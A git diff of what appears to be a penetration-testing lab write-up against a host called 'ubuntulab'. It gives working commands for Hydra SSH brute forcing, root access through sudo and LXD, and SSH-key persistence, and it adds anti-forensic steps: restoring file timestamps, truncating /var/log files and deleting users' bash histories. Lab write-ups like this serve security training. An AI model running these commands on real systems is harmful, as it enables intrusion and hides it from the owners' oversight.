@@ -177,27 +177,29 @@ ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
 Where we can notice the presence of two interesting users: `ubuntu` and `lxd`
 
 ## 🟠 via SSH 
-Since SSH is enabled, we tried to enumerate SSH users and guess their passwords. To find the SSH username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
+Since SSH is enabled, we tried to enumerate SSH users and guess their passwords by using `hydra`, we could bruteforce both usernames and passwords in one shot by executing the following command
+
+```sh 
+ ┌──(kali㉿kali)-[~/Desktop]
+ └─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.1.174 ssh
+```
+Which will take a long time, otherwise we could go by guessing and try the commonly used `ubuntu` username (even without seeing `/etc/passwd` from the previous path) and bruteforce off of it using the following command:
  ```sh
  ┌──(kali㉿kali)-[~/Desktop]
-└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.4 ssh
+└─$ hydra -l ubuntu -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.56.2 ssh
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 12:49:56
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
-[DATA] attacking ssh://192.168.56.4:22/
-[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 1 final worker threads did not complete until end.
-[ERROR] 1 target did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-09 12:50:20
-```
+[DATA] attacking ssh://192.168.56.2:22/
+[22][ssh] host: 192.168.56.2   login: ubuntu   password: admin@123
+````
+Both paths eventually lead to being able to SSH directly to the machine using username `ubuntu` and password `admin@123`
 ```sh
-[22][ssh] host: 192.168.56.4   login: ubuntu   password: admin@123
+┌─(kali㉿kali)-[~]
+└─$ ssh ubuntu@192.168.56.2
+    admin@123
+
+ubuntu@ubuntulab:~$
 ```
 
 ## 🔴 via Apache
@@ -242,7 +244,31 @@ The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
 
 We will show below what we've found.
 
-## 🟢 via Cronjob 
+
+## 🟢 via SSH
+When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
+
+Well, turns out that the aforementioned user has full root privileges.
+
+```sh
+ubuntu@ubuntulab:~$ sudo -l
+
+Matching Defaults entries for ubuntu on ubuntulab:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on ubuntulab:
+    (ALL : ALL) ALL
+```
+We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
+```sh
+ubuntu@ubuntulab:~$ sudo su
+
+[sudo] password for ubuntu: 
+root@ubuntulab:/home/ubuntu#
+```
+We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
+
+## 🟠 via Cronjob 
 By checking the `crontab` file, we noticed a particular:
 ```sh
 ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab
@@ -270,29 +296,6 @@ Then waiting 1 minute on average for the cron to execute the command and attach 
 ```
 Since the file is executed as root, the shell will be a root shell.
 
-## 🟠 via SSH
-When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.
-
-Well, turns out that the aforementioned user has full root privileges.
-
-```sh
-ubuntu@ubuntulab:~$ sudo -l
-
-Matching Defaults entries for ubuntu on ubuntulab:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User ubuntu may run the following commands on ubuntulab:
-    (ALL : ALL) ALL
-```
-We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
-```sh
-ubuntu@ubuntulab:~$ sudo su
-
-[sudo] password for ubuntu: 
-root@ubuntulab:/home/ubuntu#
-```
-We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.
-
 ## 🔴 via LXD
 We could exploit `lxd`, mounting the file system with `root` privileges, which requires to be `sudoer`.
 
@@ -307,35 +310,74 @@ ubuntu@ubuntulab:~$ lxc exec test bash
 root@test:~# 
 ```
 # Persistence
-We decided that to be persistent in the machine we would use the ssh public key authentication. In our machines we generated the ssh keys
+In order to be persistent in the machine, one of the easiest and most straightforward ways is to leverage SSH. We have generated the SSH keys in our machines:
 ```sh
-ssh-keygen
+┌──(kali㉿kali)-[~]
+└─$ ssh-keygen -t rsa -b 4096
 ```
-Then we transfered the public key `id_rsa.pub` into the machine and then we added the content of it into the `authorized_keys` file
+Then we transfered the public key `id_rsa.pub` into the machine, we did it with `scp` but there are many ways to do it
 ```sh
-cat id_rsa.pub > authorized_keys
+┌──(kali㉿kali)-[~]
+└─$ scp ~/.ssh/id_rsa.pub ubuntu@192.168.1.174:~/.ssh/id_rsa.pub
 ```
-In our machines we changed the permission of the private key `id_rsa` to be `600`
+And we added its content into the `authorized_keys` file
 ```sh
-chmod 600 id_rsa
+ubuntu@ubuntulab:~$ cat .ssh/id_rsa.pub >> .ssh/authorized_keys 
 ```
-And now we can login via `ssh` into the `root` account without needing the password and whenever we want.
-One thing we did to cover our traces was to change the creation date of the public key, so that it would not be easily detected. This can be done with the following command.
+And now we can login via `ssh` into the `root` account whenever we want (assuming the machine is up and running) and without needing any password.
+
+It's important to note that
+
+# Clearing our traces
+The job would not be complete without a proper cleanup of our traces. 
+
+## Checking for firewall logging rules
+When we first enumerated the machine, we made some noise with `nmap`, alongside all the SSH connections we did. The first thing we thought about was checking whether there were any logging rules in `iptables`, and if so, removing them.
+
+In our case there were not.
 ```sh
-touch -t YYYYMMDDhhmm id_rsa.pub
+root@ubuntulab:~# iptables -L
+
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
 ```
-# Clearing the tracks
-## Removing bash histories
-After we gained access and installed the `ssh` keys, we started to clear our traces. We started by removing all the `.bash_history` from all the users so that all the commands we issued will not be seen.
+
+## Restoring files change and access date 
+Before changing the `authorized_keys` file, we save its creation and modification date
 ```sh
-rm /ftp-user/.bash_history
-rm /ubuntu/.bash_history
-rm /root/.bash_history
+stat -c %y authorized_keys > old_mod_time
+stat -c %x authorized_keys > old_acc_time
 ```
+Modify it by adding our public key for persistance, then restoring the two dates like so 
+```sh
+touch -d "$(cat old_mod_time)" authorized_keys
+touch -a "$(cat old_acc_time)" authorized_keys
+```
+And finally every file created in doing so, including `id_rsa.pub` which we put before with `scp`
+```sh
+rm old_mod_time old_acc_time id_rsa.pub
+```
+We can also use this method to carefully restore every access and change date, if we really wanted to be stealthy.
+
 ## Clearing the logs
-We then cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely, but to just empty them out.
+Then we cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely (as it would raise more concerns victim-side), but to just empty them out
 ```sh
 truncate -s 0 /var/log/auth.log
 truncate -s 0 /var/log/cron.log
 truncate -s 0 /var/log/httpd
+```
+The most stealthy approach would be to carefully remove every time anything related to us attackers shows up in them, and subsequently restoring their respective change and access dates.
+
+## Removing bash histories
+Finally, we remove any last trace by removing every `.bash_history` file from every user so that all the commands we issued will not be seen.
+```sh
+rm ~/ftp-user/.bash_history
+rm ~/ubuntu/.bash_history
+rm ~/root/.bash_history
 ```
